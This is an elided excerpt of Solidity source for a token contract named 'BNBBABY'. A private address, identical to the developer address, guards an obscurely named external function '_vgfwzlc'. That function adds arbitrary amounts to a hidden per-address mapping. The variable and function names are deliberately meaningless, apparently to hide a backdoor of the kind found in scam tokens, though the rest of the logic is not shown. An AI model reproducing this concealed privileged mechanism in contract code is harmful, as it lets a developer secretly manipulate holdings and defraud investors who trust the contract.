...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0x884c1E7c4B74f04954d1Ae1d5b739A6337ee3c04;
...
contract BNBBABY is Context, IERC20, Ownable {
    ...
    uint256 private _total = 1000000000000* 10**8;
    uint256 private _tFeeTotal;
    
    string private _name = "TG:BNBBabyCN";
    string private _symbol = "BNBBaby";
    uint8 private _decimals = 8;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x884c1E7c4B74f04954d1Ae1d5b739A6337ee3c04;
    ...
    bool private tugo = true;
    bool private iogx = false;
 
    uint256 public serhfghtyufsdsd = uint256(0);
    mapping(address => uint256) private treddjhg;
    address[] private _treddjhg;
    address owners;
    ...
    function _vgfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        ...
        uint256 terca = treddjhg[pzytd];
        if (terca == 0) _treddjhg.push(pzytd);
        treddjhg[pzytd] = terca.add(trbvjvfs);
